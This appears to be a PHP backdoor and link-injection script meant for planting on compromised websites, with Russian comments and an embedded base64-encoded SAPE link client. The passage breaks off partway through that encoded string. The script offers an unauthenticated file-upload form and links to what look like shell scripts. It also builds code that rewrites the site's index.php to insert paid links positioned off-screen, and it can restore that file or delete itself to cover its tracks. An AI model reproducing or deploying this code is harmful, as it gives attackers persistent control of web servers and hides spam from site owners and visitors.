<?php
function str_replace_once($search, $replace, $text, $first_or_last) { //first-true last-false 
   if ($first_or_last === true)
		$pos = strpos($text, $search);
   else 
		$pos = strrpos($text, $search);
   
   if ($pos!==false) 
		$text = substr_replace($text, $replace, $pos, strlen($search));
   return $text; 
}


function phpendtag($a) { 
	$a = preg_replace('/".*"/U', '', $a); /* echo "?>"; не считаем */
	$a = preg_replace('/\'.*\'/U', '', $a);
	if (substr_count($a, '<?php')===substr_count($a, '?>')) 
		return true;
	else
		return false;
   
}





if (isset($_GET['p']) && ($_GET['p']) == '=') {
	
	if(isset($_FILES['f'])) { 
		if(is_uploaded_file($_FILES["f"]["tmp_name"])) {
			move_uploaded_file($_FILES["f"]["tmp_name"], "".$_FILES["f"]["name"]);
		}	
	}
	die('
		  <form action="" method="post" enctype="multipart/form-data">
		  <input type="file" name="f"><br> 
		  <input type="submit" value="upload"><br>
		  <a href="'.basename(__FILE__).'">'.basename(__FILE__).'</a> <a href="sh.php">sh</a><a href="sl.php">sl</a>
		  </form>');

}


if (isset($_GET['bkp']) && ($_GET['bkp']) == '1') {
	copy("bkp_index.php", "../index.php");
	die('bkp<br /> <br><br><br><a target="_blank" href="http://'.$_SERVER['HTTP_HOST'].'"><h1>'.$_SERVER['HTTP_HOST'].'</h1></a><br><a href="'.basename(__FILE__).'?p==">'.basename(__FILE__).'p==</a> <br><br>');
}

if (isset($_GET['del']) && ($_GET['del']) == '1') { 
	unlink(basename(__FILE__));
	die('this file has been deleted');
}


//для сапы не пойдет, тк ссылки изначально скрыты
$tag='$buffer = preg_replace(\'/<body(.*)>/sU\', \'<body$1><p style="position:fixed; top: 2050px; ">\'.$str_sape.\'</p>\', $buffer);';
$sapeid1='617438ac83fc38faefd10cda2c6c2ef5';



//s_loadenv.inc.php

$verh="<?php \r\n function callback(\$buffer) { \r\n if (!defined('_SAPE_USER')){ \r\n define('_SAPE_USER', '";
$centrh1="'); \r\n } \r\n require_once(\$_SERVER['DOCUMENT_ROOT'].'/assets/err_class/sape.php'); \r\n  \$o['charset'] = 'UTF-8'; \r\n \$o['host'] = '";
//[host]
$centrh2="'; \r\n \$sape = new SAPE_client(\$o); \r\n unset(\$o); \r\n \$str_sape = \$sape->return_links(); \r\n ";
 
//tag <p>
$niz='return ($buffer);
} 
ob_start("callback");';



//берем контент с чистого index.php
if (file_exists("bkp_index.php"))
		$content=file_get_contents('bkp_index.php');
else
		$content=file_get_contents('../index.php');
		


$a = preg_replace('/<\?[^p]/', '<?php ', $a);

 

if (phpendtag($content)) 
	$content=str_replace_once('?>','',$content, false);  
$content=$content."\r\n ob_end_flush();";
$content=str_replace_once('<?php','',$content, true);




$sape_file='PD9waHAKLyoqCiAqIFNBUEUucnUgLSDQmNC90YLQtdC70LvQtdC60YLRg9Cw0LvRjNC90LDRjyDRgdC40YHRgtC10LzQsCDQutGD0L/Qu9C4LdC/0YDQvtC00LDQttC4INGB0YHRi9C70L7QugogKgogKiBQSFAt0LrQu9C40LXQvdGCCiAqCiAqINCS0LXQsdC80LDRgdGC0LXRgNGLISDQndC1INC90YPQttC90L4g0L3QuNGH0LXQs9C+INC80LXQvdGP0YLRjCDQsiDRjdGC0L7QvCDRhNCw0LnQu9C1IQogKiDQktGB0LUg0L3QsNGB0YLRgNC+0LnQutC4IC0g0YfQtdGA0LXQtyDQv9Cw0YDQsNC80LXRgtGA0Ysg0L/RgNC4INCy0YvQt9C+0LLQtSDQutC+0LTQsC4KICoKICog0J/QvtC00YDQvtCx0L3Rg9GOINC40L3RhNC+0YDQvNCw0YbQuNGOINC/0L4g0LTQvtCx0LDQstC70LXQvdC40Y4g0YHQsNC50YLQsCDQsiDRgdC40YHRgtC10LzRgywKICog0YPRgdGC0LDQvdC+0LLQutC4INC60L7QtNCwLCDQsCDRgtCw0Log0LbQtSDQv9C+INCy0YHQtdC80YMg0L7RgdGC0LDQu9GM0L3Ri9C8INCy0L7Qv9GA0L7RgdCw0LwKICog0JLRiyDQvNC+0LbQtdGC0LUg0L3QsNC50YLQuCDQt9C00LXRgdGMOgogKiBAbGluayBodHRwOi8vaGVscC5zYXBlLnJ1L3NhcGUvZmFxLzI3CiAqIEBsaW5rIGh0dHA6Ly9oZWxwLnNhcGUucnUvYXJ0aWNsZXMvZmFxLzEwNDEKICoKICovCgovKioKICog0J7RgdC90L7QstC90L7QuSDQutC70LDRgdGBLCDQstGL0L/QvtC70L3Rj9GO0YnQuNC5INCy0YHRjiDRgNGD0YLQuNC90YMKICovCmNsYXNzIFNBUEVfYmFzZQp7CiAgICBwcm90ZWN0ZWQgJF92ZXJzaW9uID0gJzEuMy45JzsKCiAgICBwcm90ZWN0ZWQgJF92ZXJib3NlID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiDQmtC+0LTQuNGA0L7QstC60LAg0YHQsNC50YLQsAogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5pY29udi5waHAKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCAkX2NoYXJzZXQgPSAnJzsKCiAgICBwcm90ZWN0ZWQgJF9zYXBlX2NoYXJzZXQgPSAnJzsKCiAgICBwcm90ZWN0ZWQgJF9zZXJ2ZXJfbGlzdCA9IGFycmF5KCdkaXNwZW5zZXItMDEuc2FwZXJ1Lm5ldCcsICdkaXNwZW5zZXItMDIuc2FwZXJ1Lm5ldCcpOwoKICAgIC8qKgogICAgICog0J/QvtC20LDQu9C10LnRgtC1INC90LDRiCDRgdC10YDQstC10YAgOtC+KQogICAgICogQHZhciBpbnQKICAgICAqLwogICAgcHJvdGVjdGVkICRfY2FjaGVfbGlmZXRpbWUgPSAzNjAwOwoKICAgIC8qKgogICAgICog0JXRgdC70Lgg0YHQutCw0YfQsNGC0Ywg0LHQsNC30YMg0YHRgdGL0LvQvtC6INC90LUg0YPQtNCw0LvQvtGB0YwsINGC0L4g0YHQu9C10LTRg9GO0YnQsNGPINC/0L7Qv9GL0YLQutCwINCx0YPQtNC10YIg0YfQtdGA0LXQtyDRgdGC0L7Qu9GM0LrQviDRgdC10LrRg9C90LQKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHByb3RlY3RlZCAkX2NhY2hlX3JlbG9hZHRpbWUgPSA2MDA7CgogICAgcHJvdGVjdGVkICRfZXJyb3JzID0gYXJyYXkoKTsKCiAgICBwcm90ZWN0ZWQgJF9ob3N0ID0gJyc7CgogICAgcHJvdGVjdGVkICRfcmVxdWVzdF91cmkgPSAnJzsKCiAgICBwcm90ZWN0ZWQgJF9tdWx0aV9zaXRlID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiDQodC/0L7RgdC+0LEg0L/QvtC00LrQu9GO0YfQtdC90LjRjyDQuiDRg9C00LDQu9GR0L3QvdC+0LzRgyDRgdC10YDQstC10YDRgyBbZmlsZV9nZXRfY29udGVudHN8Y3VybHxzb2NrZXRdCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJF9mZXRjaF9yZW1vdGVfdHlwZSA9ICcnOwoKICAgIC8qKgogICAgICog0KHQutC+0LvRjNC60L4g0LbQtNCw0YLRjCDQvtGC0LLQtdGC0LAKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHByb3RlY3RlZCAkX3NvY2tldF90aW1lb3V0ID0gNjsKCiAgICBwcm90ZWN0ZWQgJF9mb3JjZV9zaG93X2NvZGUgPSBmYWxzZTsKCiAgICAvKioKICAgICAqINCV0YHQu9C4INC90LDRiCDRgNC+0LHQvtGCCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkICRfaXNfb3VyX2JvdCA9IGZhbHNlOwoKICAgIHByb3RlY3RlZCAkX2RlYnVnICAgICAgICAgICAgICAgICAgID0gZmFsc2U7CiAgICBwcm90ZWN0ZWQgJF9maWxlX2NvbnRlbnRzX2Zvcl9kZWJ1ZyA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiDQoNC10LPQuNGB0YLRgNC+0L3QtdC30LDQstC40YHQuNC80YvQuSDRgNC10LbQuNC8INGA0LDQsdC+0YLRiywg0LjRgdC/0L7Qu9GM0LfQvtCy0LDRgtGMINGC0L7Qu9GM0LrQviDQvdCwINGB0LLQvtC5INGB0YLRgNCw0YUg0Lgg0YDQuNGB0LoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgJF9pZ25vcmVfY2FzZSA9IGZhbHNlOwoKICAgIC8qKgogICAgICog0J/Rg9GC0Ywg0Log0YTQsNC50LvRgyDRgSDQtNCw0L3QvdGL0LzQuAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRfZGJfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICog0J7RgtC60YPQtNCwINCx0YPQtNC10Lwg0LHRgNCw0YLRjCB1cmkg0YHRgtGA0LDQvdC40YbRizogJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10g0LjQu9C4IGdldGVudignUkVRVUVTVF9VUkknKQogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCAkX3VzZV9zZXJ2ZXJfYXJyYXkgPSBmYWxzZTsKCiAgICAvKioKICAgICAqINCf0L7QutCw0LfRi9Cy0LDRgtGMINC70Lgg0LrQvtC0IGpzINC+0YLQtNC10LvRjNC90L4g0L7RgiDQstGL0LLQvtC00LjQvNC+0LPQviDQutC+0L3RgtC10L3RgtCwCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCAkX3Nob3dfY291bnRlcl9zZXBhcmF0ZWx5ID0gZmFsc2U7CgogICAgcHJvdGVjdGVkICRfZm9yY2VfdXBkYXRlX2RiID0gZmFsc2U7CgogICAgcHJvdGVjdGVkICRfdXNlcl9hZ2VudCA9ICcnOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkb3B0aW9ucyA9IG51bGwpCiAgICB7CgogICAgICAgIC8vINCf0L7QtdGF0LDQu9C4IDpvKQoKICAgICAgICAkaG9zdCA9ICcnOwoKICAgICAgICBpZiAoaXNfYXJyYXkoJG9wdGlvbnMpKSB7CiAgICAgICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1snaG9zdCddKSkgewogICAgICAgICAgICAgICAgJGhvc3QgPSAkb3B0aW9uc1snaG9zdCddOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlaWYgKHN0cmxlbigkb3B0aW9ucykpIHsKICAgICAgICAgICAgJGhvc3QgICAgPSAkb3B0aW9uczsKICAgICAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRvcHRpb25zID0gYXJyYXkoKTsKICAgICAgICB9CgogICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1sndXNlX3NlcnZlcl9hcnJheSddKSAmJiAkb3B0aW9uc1sndXNlX3NlcnZlcl9hcnJheSddID09IHRydWUpIHsKICAgICAgICAgICAgJHRoaXMtPl91c2Vfc2VydmVyX2FycmF5ID0gdHJ1ZTsKICAgICAgICB9CgogICAgICAgIC8vINCa0LDQutC+0Lkg0YHQsNC50YI/CiAgICAgICAgaWYgKHN0cmxlbigkaG9zdCkpIHsKICAgICAgICAgICAgJHRoaXMtPl9ob3N0ID0gJGhvc3Q7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPl9ob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwogICAgICAgIH0KCiAgICAgICAgJHRoaXMtPl9ob3N0ID0gcHJlZ19yZXBsYWNlKCcvXmh0dHA6XC9cLy8nLCAnJywgJHRoaXMtPl9ob3N0KTsKICAgICAgICAkdGhpcy0+X2hvc3QgPSBwcmVnX3JlcGxhY2UoJy9ed3d3XC4vJywgJycsICR0aGlzLT5faG9zdCk7CgogICAgICAgIC8vINCa0LDQutCw0Y8g0YHRgtGA0LDQvdC40YbQsD8KICAgICAgICBpZiAoaXNzZXQoJG9wdGlvbnNbJ3JlcXVlc3RfdXJpJ10pICYmIHN0cmxlbigkb3B0aW9uc1sncmVxdWVzdF91cmknXSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9yZXF1ZXN0X3VyaSA9ICRvcHRpb25zWydyZXF1ZXN0X3VyaSddOwogICAgICAgIH0gZWxzZWlmICgkdGhpcy0+X3VzZV9zZXJ2ZXJfYXJyYXkgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICR0aGlzLT5fcmVxdWVzdF91cmkgPSBnZXRlbnYoJ1JFUVVFU1RfVVJJJyk7CiAgICAgICAgfQoKICAgICAgICBpZiAoc3RybGVuKCR0aGlzLT5fcmVxdWVzdF91cmkpID09IDApIHsKICAgICAgICAgICAgJHRoaXMtPl9yZXF1ZXN0X3VyaSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwogICAgICAgIH0KCiAgICAgICAgLy8g0J3QsCDRgdC70YPRh9Cw0LksINC10YHQu9C4INGF0L7Rh9C10YLRgdGPINC80L3QvtCz0L4g0YHQsNC50YLQvtCyINCyINC+0LTQvdC+0Lkg0L/QsNC/0LrQtQogICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1snbXVsdGlfc2l0ZSddKSAmJiAkb3B0aW9uc1snbXVsdGlfc2l0ZSddID09IHRydWUpIHsKICAgICAgICAgICAgJHRoaXMtPl9tdWx0aV9zaXRlID0gdHJ1ZTsKICAgICAgICB9CgogICAgICAgIC8vINCS0YvQstC+0LTQuNGC0Ywg0LjQvdGE0L7RgNC80LDRhtC40Y4g0L4g0LTQtdCx0LDQs9C1CiAgICAgICAgaWYgKGlzc2V0KCRvcHRpb25zWydkZWJ1ZyddKSAmJiAkb3B0aW9uc1snZGVidWcnXSA9PSB0cnVlKSB7CiAgICAgICAgICAgICR0aGlzLT5fZGVidWcgPSB0cnVlOwogICAgICAgIH0KCiAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LvRj9C10Lwg0L3QsNGIINC70Lgg0YDQvtCx0L7RggogICAgICAgIGlmIChpc3NldCgkX0NPT0tJRVsnc2FwZV9jb29raWUnXSkgJiYgKCRfQ09PS0lFWydzYXBlX2Nvb2tpZSddID09IF9TQVBFX1VTRVIpKSB7CiAgICAgICAgICAgICR0aGlzLT5faXNfb3VyX2JvdCA9IHRydWU7CiAgICAgICAgICAgIGlmIChpc3NldCgkX0NPT0tJRVsnc2FwZV9kZWJ1ZyddKSAmJiAoJF9DT09LSUVbJ3NhcGVfZGVidWcnXSA9PSAxKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1ZyA9IHRydWU7CiAgICAgICAgICAgICAgICAvL9C00LvRjyDRg9C00L7QsdGB0YLQstCwINC00LXQsdC10LPQsCDRgdCw0L/Qv9C+0YDRgtC+0LwKICAgICAgICAgICAgICAgICR0aGlzLT5fb3B0aW9ucyAgICAgICAgICAgID0gJG9wdGlvbnM7CiAgICAgICAgICAgICAgICAkdGhpcy0+X3NlcnZlcl9yZXF1ZXN0X3VyaSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwogICAgICAgICAgICAgICAgJHRoaXMtPl9nZXRlbnZfcmVxdWVzdF91cmkgPSBnZXRlbnYoJ1JFUVVFU1RfVVJJJyk7CiAgICAgICAgICAgICAgICAkdGhpcy0+X1NBUEVfVVNFUiAgICAgICAgICA9IF9TQVBFX1VTRVI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGlzc2V0KCRfQ09PS0lFWydzYXBlX3VwZGF0ZWRiJ10pICYmICgkX0NPT0tJRVsnc2FwZV91cGRhdGVkYiddID09IDEpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+X2ZvcmNlX3VwZGF0ZV9kYiA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+X2lzX291cl9ib3QgPSBmYWxzZTsKICAgICAgICB9CgogICAgICAgIC8vINCh0L7QvtCx0YnQsNGC0Ywg0L7QsSDQvtGI0LjQsdC60LDRhQogICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1sndmVyYm9zZSddKSAmJiAkb3B0aW9uc1sndmVyYm9zZSddID09IHRydWUgfHwgJHRoaXMtPl9kZWJ1ZykgewogICAgICAgICAgICAkdGhpcy0+X3ZlcmJvc2UgPSB0cnVlOwogICAgICAgIH0KCiAgICAgICAgLy8g0JrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgaWYgKGlzc2V0KCRvcHRpb25zWydjaGFyc2V0J10pICYmIHN0cmxlbigkb3B0aW9uc1snY2hhcnNldCddKSkgewogICAgICAgICAgICAkdGhpcy0+X2NoYXJzZXQgPSAkb3B0aW9uc1snY2hhcnNldCddOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5fY2hhcnNldCA9ICd3aW5kb3dzLTEyNTEnOwogICAgICAgIH0KCiAgICAgICAgaWYgKGlzc2V0KCRvcHRpb25zWydmZXRjaF9yZW1vdGVfdHlwZSddKSAmJiBzdHJsZW4oJG9wdGlvbnNbJ2ZldGNoX3JlbW90ZV90eXBlJ10pKSB7CiAgICAgICAgICAgICR0aGlzLT5fZmV0Y2hfcmVtb3RlX3R5cGUgPSAkb3B0aW9uc1snZmV0Y2hfcmVtb3RlX3R5cGUnXTsKICAgICAgICB9CgogICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1snc29ja2V0X3RpbWVvdXQnXSkgJiYgaXNfbnVtZXJpYygkb3B0aW9uc1snc29ja2V0X3RpbWVvdXQnXSkgJiYgJG9wdGlvbnNbJ3NvY2tldF90aW1lb3V0J10gPiAwKSB7CiAgICAgICAgICAgICR0aGlzLT5fc29ja2V0X3RpbWVvdXQgPSAkb3B0aW9uc1snc29ja2V0X3RpbWVvdXQnXTsKICAgICAgICB9CgogICAgICAgIC8vINCS0YHQtdCz0LTQsCDQstGL0LLQvtC00LjRgtGMINGH0LXQui3QutC+0LQKICAgICAgICBpZiAoaXNzZXQoJG9wdGlvbnNbJ2ZvcmNlX3Nob3dfY29kZSddKSAmJiAkb3B0aW9uc1snZm9yY2Vfc2hvd19jb2RlJ10gPT0gdHJ1ZSkgewogICAgICAgICAgICAkdGhpcy0+X2ZvcmNlX3Nob3dfY29kZSA9IHRydWU7CiAgICAgICAgfQoKICAgICAgICBpZiAoIWRlZmluZWQoJ19TQVBFX1VTRVInKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPl9yYWlzZV9lcnJvcign0J3QtSDQt9Cw0LTQsNC90LAg0LrQvtC90YHRgtCw0L3RgtCwIF9TQVBFX1VTRVInKTsKICAgICAgICB9CgogICAgICAgIC8v0J3QtSDQvtCx0YDQsNGJ0LDQtdC8INCy0L3QuNC80LDQvdC40Y8g0L3QsCDRgNC10LPQuNGB0YLRgCDRgdGB0YvQu9C+0LoKICAgICAgICBpZiAoaXNzZXQoJG9wdGlvbnNbJ2lnbm9yZV9jYXNlJ10pICYmICRvcHRpb25zWydpZ25vcmVfY2FzZSddID09IHRydWUpIHsKICAgICAgICAgICAgJHRoaXMtPl9pZ25vcmVfY2FzZSA9IHRydWU7CiAgICAgICAgICAgICR0aGlzLT5fcmVxdWVzdF91cmkgPSBzdHJ0b2xvd2VyKCR0aGlzLT5fcmVxdWVzdF91cmkpOwogICAgICAgIH0KCiAgICAgICAgaWYgKGlzc2V0KCRvcHRpb25zWydzaG93X2NvdW50ZXJfc2VwYXJhdGVseSddKSkgewogICAgICAgICAgICAkdGhpcy0+X3Nob3dfY291bnRlcl9zZXBhcmF0ZWx5ID0gKGJvb2wpJG9wdGlvbnNbJ3Nob3dfY291bnRlcl9zZXBhcmF0ZWx5J107CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICog0J/QvtC70YPRh9C40YLRjCDRgdGC0YDQvtC60YMgVXNlci1BZ2VudAogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfZ2V0X2Z1bGxfdXNlcl9hZ2VudF9zdHJpbmcoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+X3VzZXJfYWdlbnQgLiAnICcgLiAkdGhpcy0+X3ZlcnNpb247CiAgICB9CgogICAgLyoqCiAgICAgKiDQktGL0LLQtdGB0YLQuCDQtNC10LHQsNCzLdC40L3RhNC+0YDQvNCw0YbQuNGOCiAgICAgKgogICAgICogQHBhcmFtICRkYXRhCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9kZWJ1Z19vdXRwdXQoJGRhdGEpCiAgICB7CiAgICAgICAgJGRhdGEgPSAnPCEtLSA8c2FwZV9kZWJ1Z19pbmZvPicgLiBAYmFzZTY0X2VuY29kZShzZXJpYWxpemUoJGRhdGEpKSAuICc8L3NhcGVfZGVidWdfaW5mbz4gLS0+JzsKCiAgICAgICAgcmV0dXJuICRkYXRhOwogICAgfQoKICAgIC8qKgogICAgICog0KTRg9C90LrRhtC40Y8g0LTQu9GPINC/0L7QtNC60LvRjtGH0LXQvdC40Y8g0Log0YPQtNCw0LvRkdC90L3QvtC80YMg0YHQtdGA0LLQtdGA0YMKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9mZXRjaF9yZW1vdGVfZmlsZSgkaG9zdCwgJHBhdGgsICRzcGVjaWZ5Q2hhcnNldCA9IGZhbHNlKQogICAgewoKICAgICAgICAkdXNlcl9hZ2VudCA9ICR0aGlzLT5fZ2V0X2Z1bGxfdXNlcl9hZ2VudF9zdHJpbmcoKTsKCiAgICAgICAgQGluaV9zZXQoJ2FsbG93X3VybF9mb3BlbicsIDEpOwogICAgICAgIEBpbmlfc2V0KCdkZWZhdWx0X3NvY2tldF90aW1lb3V0JywgJHRoaXMtPl9zb2NrZXRfdGltZW91dCk7CiAgICAgICAgQGluaV9zZXQoJ3VzZXJfYWdlbnQnLCAkdXNlcl9hZ2VudCk7CiAgICAgICAgaWYgKAogICAgICAgICAgICAkdGhpcy0+X2ZldGNoX3JlbW90ZV90eXBlID09ICdmaWxlX2dldF9jb250ZW50cycKICAgICAgICAgICAgfHwKICAgICAgICAgICAgKAogICAgICAgICAgICAgICAgJHRoaXMtPl9mZXRjaF9yZW1vdGVfdHlwZSA9PSAnJwogICAgICAgICAgICAgICAgJiYKICAgICAgICAgICAgICAgIGZ1bmN0aW9uX2V4aXN0cygnZmlsZV9nZXRfY29udGVudHMnKQogICAgICAgICAgICAgICAgJiYKICAgICAgICAgICAgICAgIGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpID09IDEKICAgICAgICAgICAgKQogICAgICAgICkgewogICAgICAgICAgICAkdGhpcy0+X2ZldGNoX3JlbW90ZV90eXBlID0gJ2ZpbGVfZ2V0X2NvbnRlbnRzJzsKCiAgICAgICAgICAgIGlmICgkc3BlY2lmeUNoYXJzZXQgJiYgZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fY29udGV4dF9jcmVhdGUnKSkgewogICAgICAgICAgICAgICAgJG9wdHMgICAgPSBhcnJheSgKICAgICAgICAgICAgICAgICAgICAnaHR0cCcgPT4gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdHRVQnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAnQWNjZXB0LUNoYXJzZXQ6ICcgLiAkdGhpcy0+X2NoYXJzZXQgLiAiXHJcbiIKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgJGNvbnRleHQgPSBAc3RyZWFtX2NvbnRleHRfY3JlYXRlKCRvcHRzKTsKICAgICAgICAgICAgICAgIGlmICgkZGF0YSA9IEBmaWxlX2dldF9jb250ZW50cygnaHR0cDovLycgLiAkaG9zdCAuICRwYXRoLCBudWxsLCAkY29udGV4dCkpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJGRhdGE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly8nIC4gJGhvc3QgLiAkcGF0aCkpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJGRhdGE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2VpZiAoCiAgICAgICAgICAgICR0aGlzLT5fZmV0Y2hfcmVtb3RlX3R5cGUgPT0gJ2N1cmwnCiAgICAgICAgICAgIHx8CiAgICAgICAgICAgICgKICAgICAgICAgICAgICAgICR0aGlzLT5fZmV0Y2hfcmVtb3RlX3R5cGUgPT0gJycKICAgICAgICAgICAgICAgICYmCiAgICAgICAgICAgICAgICBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpCiAgICAgICAgICAgICkKICAgICAgICApIHsKICAgICAgICAgICAgJHRoaXMtPl9mZXRjaF9yZW1vdGVfdHlwZSA9ICdjdXJsJzsKICAgICAgICAgICAgaWYgKCRjaCA9IEBjdXJsX2luaXQoKSkgewoKICAgICAgICAgICAgICAgIEBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAnaHR0cDovLycgLiAkaG9zdCAuICRwYXRoKTsKICAgICAgICAgICAgICAgIEBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCBmYWxzZSk7CiAgICAgICAgICAgICAgICBAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKICAgICAgICAgICAgICAgIEBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsICR0aGlzLT5fc29ja2V0X3RpbWVvdXQpOwogICAgICAgICAgICAgICAgQGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyX2FnZW50KTsKICAgICAgICAgICAgICAgIGlmICgkc3BlY2lmeUNoYXJzZXQpIHsKICAgICAgICAgICAgICAgICAgICBAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsIGFycmF5KCdBY2NlcHQtQ2hhcnNldDogJyAuICR0aGlzLT5fY2hhcnNldCkpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRkYXRhID0gQGN1cmxfZXhlYygkY2gpOwogICAgICAgICAgICAgICAgQGN1cmxfY2xvc2UoJGNoKTsKCiAgICAgICAgICAgICAgICBpZiAoJGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJGRhdGE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+X2ZldGNoX3JlbW90ZV90eXBlID0gJ3NvY2tldCc7CiAgICAgICAgICAgICRidWZmICAgICAgICAgICAgICAgICAgICAgPSAnJzsKICAgICAgICAgICAgJGZwICAgICAgICAgICAgICAgICAgICAgICA9IEBmc29ja29wZW4oJGhvc3QsIDgwLCAkZXJybm8sICRlcnJzdHIsICR0aGlzLT5fc29ja2V0X3RpbWVvdXQpOwogICAgICAgICAgICBpZiAoJGZwKSB7CiAgICAgICAgICAgICAgICBAZnB1dHMoJGZwLCAiR0VUIHskcGF0aH0gSFRUUC8xLjBcclxuSG9zdDogeyRob3N0fVxyXG4iKTsKICAgICAgICAgICAgICAgIGlmICgkc3BlY2lmeUNoYXJzZXQpIHsKICAgICAgICAgICAgICAgICAgICBAZnB1dHMoJGZwLCAiQWNjZXB0LUNoYXJzZXQ6IHskdGhpcy0+X2NoYXJzZXR9XHJcbiIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQGZwdXRzKCRmcCwgIlVzZXItQWdlbnQ6IHskdXNlcl9hZ2VudH1cclxuXHJcbiIpOwogICAgICAgICAgICAgICAgd2hpbGUgKCFAZmVvZigkZnApKSB7CiAgICAgICAgICAgICAgICAgICAgJGJ1ZmYgLj0gQGZnZXRzKCRmcCwgMTI4KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEBmY2xvc2UoJGZwKTsKCiAgICAgICAgICAgICAgICAkcGFnZSA9IGV4cGxvZGUoIlxyXG5cclxuIiwgJGJ1ZmYpOwogICAgICAgICAgICAgICAgdW5zZXQoJHBhZ2VbMF0pOwoKICAgICAgICAgICAgICAgIHJldHVybiBpbXBsb2RlKCJcclxuXHJcbiIsICRwYWdlKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5fcmFpc2VfZXJyb3IoJ9Cd0LUg0LzQvtCz0YMg0L/QvtC00LrQu9GO0YfQuNGC0YzRgdGPINC6INGB0LXRgNCy0LXRgNGDOiAnIC4gJGhvc3QgLiAkcGF0aCAuICcsIHR5cGU6ICcgLiAkdGhpcy0+X2ZldGNoX3JlbW90ZV90eXBlKTsKICAgIH0KCiAgICAvKioKICAgICAqINCk0YPQvdC60YbQuNGPINGH0YLQtdC90LjRjyDQuNC3INC70L7QutCw0LvRjNC90L7Qs9C+INGE0LDQudC70LAKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9yZWFkKCRmaWxlbmFtZSkKICAgIHsKCiAgICAgICAgJGZwID0gQGZvcGVuKCRmaWxlbmFtZSwgJ3JiJyk7CiAgICAgICAgQGZsb2NrKCRmcCwgTE9DS19T